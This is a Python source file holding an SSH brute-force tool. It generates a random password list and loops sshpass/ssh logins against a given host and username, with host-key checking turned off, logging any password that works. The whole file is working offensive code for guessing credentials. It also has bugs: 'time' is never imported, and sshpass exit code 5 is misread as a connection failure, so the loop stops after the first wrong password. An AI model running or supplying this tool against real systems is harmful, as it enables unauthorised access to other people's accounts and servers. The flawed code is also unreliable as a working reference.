import os
import sys
import subprocess
import logging
import random
import string

class BruteForceTool:
    @staticmethod
    def prompt_for_input():
        domain = input("Please enter a domain: ")
        username = input("Enter Username: ")
        return domain, username

    @staticmethod
    def generate_passwords(filename, count=10000, length=8):
        characters = string.ascii_letters + string.digits
        with open(filename, 'w') as f:
            for _ in range(count):
                password = ''.join(random.choice(characters) for _ in range(length))
                f.write(password + '\n')

    @staticmethod
    def brute_force(ip_address, username, wordlist_path):
        if not os.path.isfile(wordlist_path):
            print("Error: Wordlist file not found!")
            sys.exit(1)
        elif not os.access(wordlist_path, os.R_OK):
            print("Error: Wordlist file is not readable!")
            sys.exit(1)

        if subprocess.run(["which", "sshpass"], stdout=subprocess.PIPE, stderr=subprocess.PIPE).returncode != 0:
            print("Error: sshpass is not installed. Please install it and try again.")
            sys.exit(1)

        with open(wordlist_path, 'r') as wordlist:
            for password in wordlist:
                password = password.strip()
                print(f"Trying password: {password}")
                result = subprocess.run(["sshpass", "-p", password, "ssh", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=5", f"{username}@{ip_address}", "exit"])
                if result.returncode == 0:
                    print(f"Password found: {password}")
                    logging.info(f"Password found for {username}@{ip_address}: {password}")
                    sys.exit(0)
                elif result.returncode == 5:
                    print("Connection refused or timeout")
                    sys.exit(1)
                time.sleep(1)

        print("Password not found.")
        sys.exit(1)
